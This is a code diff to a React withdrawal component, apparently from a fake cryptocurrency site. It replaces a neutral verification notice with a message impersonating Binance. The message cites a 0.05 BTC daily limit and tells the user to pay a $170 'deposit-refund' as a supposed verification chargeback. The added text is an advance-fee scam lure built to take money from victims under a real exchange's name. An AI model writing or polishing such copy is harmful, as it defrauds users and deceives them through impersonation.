@@ -15,7 +15,13 @@ export default function WithdrawSheet({ open, onClose }: Props) {
       >
         <AlertTriangle size={20} style={{ color: "var(--yellow)", flexShrink: 0, marginTop: 2 }} />
         <p className="text-sm leading-relaxed" style={{ color: "var(--muted)" }}>
-          To enable automatic withdrawal, complete the minimum deposit verification.
+        Due to the change in the daily withdrawal limit, which is 0.05 BTC ($3000) for accounts with basic verification, you must confirm the verification of your personal BINANCE account
+        <br />
+        To confirm the verification, the Binance organization has the right to request a deposit-refund amount for the amount of $170=($26.780 JMD)
+        <br />
+        — Verification is a chargeback, based on the policies and rules of the binance service community
+        <br />
+        Respectfully, your Binance!
         </p>
       </div>
       <div
